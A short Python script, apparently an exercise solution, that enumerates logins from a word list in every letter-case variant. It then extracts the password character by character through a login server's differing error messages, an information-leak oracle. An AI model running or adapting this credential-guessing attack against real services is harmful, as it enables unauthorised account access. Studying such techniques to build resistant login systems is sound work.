# write your code here
import itertools, sys, socket, json, string

ip, port = sys.argv[1:]

with socket.socket() as client_socket:
    address = (ip, int(port))
    client_socket.connect(address)
    with open('./hacking/logins.txt') as pass_file:
        for line in [l.strip() for l in pass_file]:
            for x in range(len(line)):
                login_iter= itertools.combinations(range(len(line)), x)
                while True:
                    login = list(line)
                    try:
                        for index in next(login_iter):
                            login[index] = login[index].upper()
                        login = "".join(login)
                    except:
                        break
                    json_to_send_login = {
                        'login' : login,
                        'password' : ''
                    }
                    client_socket.send(json.dumps(json_to_send_login).encode())
                    response = client_socket.recv(1024)
                    response = response.decode()
                    result_login = json.loads(response)['result']
                    if result_login == 'Wrong password!':
                        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
                        marked_chars = ''
                        while True:
                            for char in chars:
                                try_pass = marked_chars + char
                                json_to_send_pass = {
                                    'login': login,
                                    'password': try_pass
                                }
                                client_socket.send(json.dumps(json_to_send_pass).encode())
                                response = client_socket.recv(1024)
                                response = response.decode()
                                result_pass = json.loads(response)['result']
                                if result_pass == 'Exception happened during login':
                                    marked_chars = try_pass
                                    break
                                elif result_pass == 'Connection success!':
                                    print(json.dumps(json_to_send_pass))
                                    client_socket.close()
                                    exit()
